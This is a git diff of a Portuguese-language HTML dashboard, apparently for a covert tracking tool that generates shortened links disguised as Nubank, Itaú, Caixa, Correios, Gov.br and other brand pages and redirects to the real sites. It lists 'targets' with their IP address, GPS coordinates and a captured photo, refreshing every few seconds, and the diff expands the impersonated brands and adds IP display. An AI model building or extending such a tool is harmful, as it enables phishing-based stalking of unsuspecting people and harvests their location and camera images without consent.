@@ -3,52 +3,91 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enterprise Tracker v7 - Camuflagem</title>
+    <title>Enterprise Tracker v5 - PRO</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
     
     <style>
-        :root { --primary: #3b82f6; --bg-body: #f1f5f9; --bg-sidebar: #ffffff; --text-main: #1e293b; --text-muted: #64748b; --border: #e2e8f0; --accent: #10b981; }
-        body { font-family: 'Inter', sans-serif; margin: 0; display: flex; height: 100vh; background-color: var(--bg-body); color: var(--text-main); overflow: hidden; }
-        #sidebar { width: 380px; background: var(--bg-sidebar); border-right: 1px solid var(--border); overflow-y: auto; display: flex; flex-direction: column; z-index: 1000; box-shadow: 10px 0 15px rgba(0,0,0,0.02); }
-        #sidebar-header { padding: 24px; background: #fff; border-bottom: 1px solid var(--border); }
-        #sidebar-header h2 { margin: 0; font-size: 18px; font-weight: 600; color: var(--primary); letter-spacing: -0.5px; }
+        :root { 
+            --primary: #3b82f6;
+            --bg-body: #f1f5f9;
+            --bg-sidebar: #ffffff;
+            --text-main: #1e293b;
+            --text-muted: #64748b;
+            --border: #e2e8f0;
+            --accent: #10b981;
+        }
+
+        body { 
+            font-family: 'Inter', sans-serif; 
+            margin: 0; display: flex; height: 100vh; 
+            background-color: var(--bg-body); color: var(--text-main); overflow: hidden; 
+        }
+
+        #sidebar { 
+            width: 380px; background: var(--bg-sidebar); border-right: 1px solid var(--border); 
+            overflow-y: auto; display: flex; flex-direction: column; z-index: 1000;
+        }
+
+        #sidebar-header { 
+            padding: 24px; background: #fff; border-bottom: 1px solid var(--border); 
+            display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center;
+        }
+
+        .logo-projeto { max-width: 180px; height: auto; display: block; margin-bottom: 10px; }
         #sidebar-header small { color: var(--accent); font-weight: 600; font-size: 10px; text-transform: uppercase; }
+
         #sidebar-content { padding: 20px; }
         #mapa { flex: 1; height: 100%; z-index: 1; }
+
         .form-group { margin-bottom: 16px; }
         label { font-size: 11px; font-weight: 600; color: var(--text-muted); margin-bottom: 6px; display: block; }
-        .alias-input-wrapper { display: flex; align-items: center; background: #fff; border: 1px solid var(--border); border-radius: 8px; padding-left: 10px; }
-        .alias-prefix { font-size: 12px; color: var(--text-muted); user-select: none; }
-        input[type="text"], select { width: 100%; padding: 10px 12px; background: #fff; border: 1px solid var(--border); border-radius: 8px; color: var(--text-main); font-family: inherit; font-size: 13px; box-sizing: border-box; }
-        .alias-input-wrapper input { border: none !important; box-shadow: none !important; padding-left: 4px !important; }
-        button.btn-primary { background: var(--primary); color: #fff; width: 100%; padding: 12px; border: none; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 14px; margin-top: 10px; }
-        .telemetry-card { background: #fff; border: 1px solid var(--border); border-radius: 12px; margin-bottom: 16px; overflow: hidden; }
+
+        input[type="text"], select { 
+            width: 100%; padding: 10px 12px; border: 1px solid var(--border); border-radius: 8px;
+            font-size: 13px; box-sizing: border-box; font-family: inherit;
+        }
+
+        .alias-container { display: flex; align-items: center; background: #fff; border: 1px solid var(--border); border-radius: 8px; padding-left: 12px; }
+        .alias-prefix { font-size: 13px; color: var(--text-muted); padding-right: 2px; }
+        .alias-container input { border: none; padding: 10px 0; outline: none; flex: 1; border-radius: 0 8px 8px 0; font-size: 13px; }
+
+        button.btn-primary { 
+            background: var(--primary); color: #fff; width: 100%; padding: 14px; border: none; 
+            border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 14px; margin-top: 10px;
+        }
+
+        .separator { position: relative; border-top: 1px solid var(--border); margin: 30px 0 20px 0; }
+        .separator span { position: absolute; top: -10px; left: 15px; background: #fff; padding: 0 8px; font-size: 10px; font-weight: 700; color: var(--text-muted); text-transform: uppercase; }
+
+        /* CARDS DE TELEMETRIA */
+        .telemetry-card { background: #fff; border: 1px solid var(--border); border-radius: 12px; margin-bottom: 16px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.02); }
         .card-header { padding: 12px 16px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; background: #fcfcfd; }
-        .motorista-nome { font-weight: 600; color: var(--text-main); font-size: 13px; }
-        .btn-delete { color: #cbd5e1; background: none; border: none; font-size: 20px; cursor: pointer; }
-        .btn-delete:hover { color: #f43f5e; }
         .card-body { padding: 16px; }
-        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 12px; }
-        .info-value { color: var(--text-main); font-size: 12px; font-weight: 500; display: block; overflow: hidden; text-overflow: ellipsis; }
-        .foto-preview { grid-column: span 2; margin-top: 8px; border: 1px solid var(--border); background: #f8fafc; border-radius: 8px; overflow: hidden; }
-        .foto-img { width: 100%; height: auto; display: block; }
-        .link-display { background: #f1f5f9; border: 1px solid var(--border); padding: 8px; font-size: 11px; color: var(--primary); width: 100%; border-radius: 6px; margin-bottom: 12px; }
-        .action-bar { display: flex; gap: 8px; padding: 12px 16px; background: #f8fafc; border-top: 1px solid var(--border); }
-        .btn-zap { flex: 2; background: #fff; color: var(--text-main); border: 1px solid var(--border); border-radius: 6px; padding: 8px; cursor: pointer; font-size: 12px; font-weight: 600; }
-        .btn-locate { flex: 1; background: var(--primary); color: #fff; border: none; border-radius: 6px; padding: 8px; cursor: pointer; font-size: 11px; font-weight: 600; }
-        .status-dot { height: 8px; width: 8px; background-color: #cbd5e1; border-radius: 50%; display: inline-block; margin-right: 8px; }
-        .online { background-color: var(--accent); box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.1); }
-        .separator-title { color: var(--text-muted); font-size: 10px; font-weight: 700; background: #fff; padding: 0 10px; position: absolute; top: -7px; left: 10px; }
-        .leaflet-container { background: #e5e7eb; }
+        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+        .info-label { font-size: 10px; color: var(--text-muted); font-weight: 600; text-transform: uppercase; }
+        .info-value { color: var(--text-main); font-size: 11px; font-weight: 500; display: block; overflow: hidden; text-overflow: ellipsis; }
+        
+        .foto-preview { grid-column: span 2; margin-top: 10px; border: 1px solid var(--border); background: #f8fafc; border-radius: 8px; overflow: hidden; height: 160px; display: flex; align-items: center; justify-content: center; }
+        .foto-img { width: 100%; height: 100%; object-fit: cover; }
+        
+        .link-display { background: #f1f5f9; border: 1px solid var(--border); padding: 8px; font-size: 10px; color: var(--primary); width: 100%; border-radius: 6px; margin: 12px 0; cursor: pointer; text-align: center; }
+        
+        .action-bar { display: grid; grid-template-columns: 1fr; gap: 8px; padding: 12px 16px; background: #f8fafc; border-top: 1px solid var(--border); }
+        .btn-copy { background: #fff; border: 1px solid var(--border); border-radius: 6px; padding: 10px; cursor: pointer; font-size: 11px; font-weight: 700; color: var(--text-main); text-transform: uppercase; }
+        .btn-locate-map { background: var(--primary); color: #fff; border: none; padding: 12px; border-radius: 6px; cursor: pointer; font-weight: 700; font-size: 11px; text-transform: uppercase; }
+
+        .status-dot { height: 8px; width: 8px; border-radius: 50%; display: inline-block; margin-right: 5px; background: #cbd5e1; }
+        .online { background: var(--accent); }
     </style>
 </head>
 <body>
     <div id="sidebar">
         <div id="sidebar-header">
-            <h2>Enterprise Tracker</h2>
-            <small>● Sistema Ativo</small>
+            <img src="{{ url_for('static', filename='logoGERCS.png') }}" alt="Logo" class="logo-projeto">
+            <small>● SISTEMA ATIVO</small>
         </div>
+        
         <div id="sidebar-content">
             <form action="/gerar_ordem" method="POST">
                 <div class="form-group">
@@ -56,26 +95,47 @@
                     <input type="text" name="motorista" placeholder="Ex: João Silva" required>
                 </div>
                 
-                <div style="margin: 30px 0 20px 0; border-top: 1px solid var(--border); position: relative;">
-                    <span class="separator-title">CONFIGURAÇÃO DO LINK</span>
-                </div>
+                <div class="separator"><span>CONFIGURAÇÃO DO LINK</span></div>
                 
                 <div class="form-group">
                     <label>Alias (Link Personalizado)</label>
-                    <div class="alias-input-wrapper">
+                    <div class="alias-container">
                         <span class="alias-prefix">tinyurl.com/</span>
                         <input type="text" name="personalizacao" placeholder="ex: comprovante-pix-joao">
                     </div>
                 </div>
-
+                
                 <div class="form-group">
                     <label>Aparência no WhatsApp (Camuflagem)</label>
-                    <select name="tema">
-                        <option value="nubank">🟣 Nubank (Comprovante PIX)</option>
-                        <option value="correios">📦 Correios (Rastreio)</option>
-                        <option value="maps">📍 Google Maps (Localização)</option>
-                        <option value="g1">🔴 Notícia G1 (Urgente)</option>
-                        <option value="padrao">📄 Arquivo PDF (Padrão)</option>
+                    <select name="camuflagem">
+                        <optgroup label="Financeiro">
+                            <option value="nubank">🟣 Nubank (Comprovante PIX)</option>
+                            <option value="itau">🟠 Itaú (Comprovante Pagamento)</option>
+                            <option value="bradesco">🔴 Bradesco (Extrato PDF)</option>
+                            <option value="caixa">🔵 Caixa (Boleto Atualizado)</option>
+                            <option value="santander">⚪ Santander (Fatura)</option>
+                            <option value="inter">🟠 Inter (Recibo)</option>
+                        </optgroup>
+                        <optgroup label="Entregas/Logística">
+                            <option value="correios">📦 Correios (Rastreio)</option>
+                            <option value="mercadolivre">🟡 Mercado Livre (NF-e)</option>
+                            <option value="fedex">🟣 FedEx (Entrega)</option>
+                            <option value="shopee">🟠 Shopee (Pedido)</option>
+                        </optgroup>
+                        <optgroup label="Mídia/Notícias">
+                            <option value="g1">🔴 Notícia G1 (Urgente)</option>
+                            <option value="youtube">📹 Vídeo YouTube</option>
+                            <option value="tiktok">🎵 Vídeo TikTok</option>
+                            <option value="cnn">🔴 CNN Brasil</option>
+                        </optgroup>
+                        <optgroup label="Utilidades">
+                            <option value="pdf">📄 Arquivo PDF (Padrão)</option>
+                            <option value="govbr">🏛️ Portal Gov.br</option>
+                            <option value="maps">📍 Google Maps</option>
+                            <option value="drive">📂 Google Drive</option>
+                            <option value="vcard">👤 Contato VCF</option>
+                            <option value="zoom">🎥 Reunião Zoom</option>
+                        </optgroup>
                     </select>
                 </div>
                 
@@ -83,16 +143,24 @@
                     <label>Redirecionamento Final</label>
                     <select name="redirect">
                         <option value="https://www.google.com">Google (Seguro)</option>
-                        <option value="https://nubank.com.br">Nubank</option>
-                        <option value="https://rastreamento.correios.com.br">Correios</option>
-                        <option value="https://g1.globo.com">G1</option>
+                        <option value="https://nubank.com.br">Nubank (Oficial)</option>
+                        <option value="https://rastreamento.correios.com.br">Correios (Oficial)</option>
+                        <option value="https://www.gov.br">Portal Gov.br</option>
+                        <option value="https://www.mercadolivre.com.br">Mercado Livre</option>
+                        <option value="https://www.itau.com.br">Banco Itaú</option>
+                        <option value="https://www.bb.com.br">Banco do Brasil</option>
+                        <option value="https://www.receita.fazenda.gov.br">Receita Federal</option>
+                        <option value="https://www.whatsapp.com">WhatsApp Web</option>
+                        <option value="https://www.g1.globo.com">Portal G1</option>
+                        <option value="https://www.instagram.com">Instagram</option>
+                        <option value="https://www.netflix.com">Netflix</option>
                     </select>
                 </div>
                 
-                <button type="submit" class="btn-primary">Gerar Novo Rastreio</button>
+                <button type="submit" class="btn-primary">Gerar Link para Rastreio</button>
             </form>
 
-            <div style="border-top: 1px solid var(--border); margin: 30px 0;"></div>
+            <div class="separator"><span>ALVOS EM MONITORAMENTO</span></div>
             <div id="lista-frota"></div>
         </div>
     </div>
@@ -103,54 +171,58 @@
     <script>
         var map = L.map('mapa', { zoomControl: false }).setView([-14.23, -51.92], 4);
         L.control.zoom({ position: 'bottomright' }).addTo(map);
-        L.tileLayer('https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png', { attribution: '©OpenStreetMap' }).addTo(map);
+        L.tileLayer('https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png').addTo(map);
 
         var markers = {};
-        var primeiraVez = true;
-
-        function copiarZap(link) { navigator.clipboard.writeText(link).then(() => alert("Link copiado com sucesso!")); }
-        function excluirOrdem(id, nome) { if(confirm(`Remover rastreio de: ${nome}?`)) fetch(`/excluir/${id}`, {method:'DELETE'}).then(() => atualizar()); }
-        function focar(lat, lon) { map.flyTo([lat, lon], 17); }
 
         function atualizar() {
             fetch('/api/frota').then(r => r.json()).then(frota => {
                 const div = document.getElementById('lista-frota');
                 div.innerHTML = "";
                 for (const [id, dados] of Object.entries(frota)) {
-                    const onlineClass = dados.status.includes("Online") ? "online" : "";
-                    const bLoc = dados.lat ? `<button class="btn-locate" onclick="focar(${dados.lat}, ${dados.lon})">LOCALIZAR</button>` : `<button class="btn-locate" style="opacity:0.4; cursor:default;">AGUARDANDO</button>`;
-                    const fotoHtml = dados.foto ? `<img src="${dados.foto}" class="foto-img">` : `<div style="padding: 20px; text-align:center; color:#94a3b8; font-size:10px;">Sem captura</div>`;
+                    const statusClass = dados.status.includes("Online") ? "online" : "";
+                    const fotoHtml = dados.foto ? `<img src="${dados.foto}" class="foto-img">` : `<span style="font-size:10px; color:#94a3b8;">Aguardando Captura...</span>`;
+                    
+                    const latVal = dados.lat ? dados.lat.toFixed(6) : "---";
+                    const lonVal = dados.lon ? dados.lon.toFixed(6) : "---";
 
                     div.innerHTML += `
                         <div class="telemetry-card">
                             <div class="card-header">
-                                <div><span class="status-dot ${onlineClass}"></span><span class="motorista-nome">${dados.motorista}</span></div>
-                                <button class="btn-delete" onclick="excluirOrdem('${id}', '${dados.motorista}')">&times;</button>
+                                <div><span class="status-dot ${statusClass}"></span><b>${dados.motorista}</b></div>
+                                <button style="color:#f87171; background:none; border:none; cursor:pointer; font-size:16px;" onclick="if(confirm('Excluir alvo?')) fetch('/excluir/${id}', {method:'DELETE'}).then(atualizar)">&times;</button>
                             </div>
                             <div class="card-body">
                                 <div class="info-grid">
-                                    <div><label>Tema</label><span class="info-value" style="text-transform:uppercase">${dados.tema || 'Padrão'}</span></div>
-                                    <div><label>Visto</label><span class="info-value">${dados.ultimo_visto}</span></div>
-                                    <div><label>Lat</label><span class="info-value">${dados.lat ? dados.lat.toFixed(5) : '--'}</span></div>
-                                    <div><label>Lon</label><span class="info-value">${dados.lon ? dados.lon.toFixed(5) : '--'}</span></div>
+                                    <div><div class="info-label">Último Sinal</div><div class="info-value">${dados.ultimo_visto}</div></div>
+                                    <div><div class="info-label">Endereço IP</div><div class="info-value">${dados.ip || '---'}</div></div>
+                                    <div><div class="info-label">Latitude</div><div class="info-value">${latVal}</div></div>
+                                    <div><div class="info-label">Longitude</div><div class="info-value">${lonVal}</div></div>
                                     <div class="foto-preview">${fotoHtml}</div>
                                 </div>
-                                <input type="text" class="link-display" value="${dados.link}" readonly>
+                                <div class="link-display" onclick="navigator.clipboard.writeText('${dados.link}'); alert('Link copiado!');">
+                                    ${dados.link}
+                                </div>
                             </div>
-                            <div class="action-bar"><button class="btn-zap" onclick="copiarZap('${dados.link}')">COPIAR LINK</button>${bLoc}</div>
+                            <div class="action-bar">
+                                <button class="btn-copy" onclick="navigator.clipboard.writeText('${dados.link}'); alert('Link copiado!')">Copiar Link</button>
+                                ${dados.lat ? `<button class="btn-locate-map" onclick="map.flyTo([${dados.lat}, ${dados.lon}], 18)">Focar no Alvo</button>` : ''}
+                            </div>
                         </div>`;
                     
-                    if(dados.lat) {
-                        if(markers[id]) markers[id].setLatLng([dados.lat, dados.lon]);
-                        else {
-                            markers[id] = L.marker([dados.lat, dados.lon]).addTo(map).bindPopup(`<b>${dados.motorista}</b>`);
-                            if(primeiraVez) { focar(dados.lat, dados.lon); primeiraVez = false; }
+                    if(dados.lat && dados.lon) {
+                        if(!markers[id]) {
+                            markers[id] = L.marker([dados.lat, dados.lon]).addTo(map)
+                                .bindPopup(`<b>${dados.motorista}</b><br>Visto: ${dados.ultimo_visto}`);
+                        } else {
+                            markers[id].setLatLng([dados.lat, dados.lon]);
                         }
                     }
                 }
             });
         }
-        setInterval(atualizar, 3000); atualizar();
+        setInterval(atualizar, 3000); 
+        atualizar();
     </script>
 </body>
 </html>
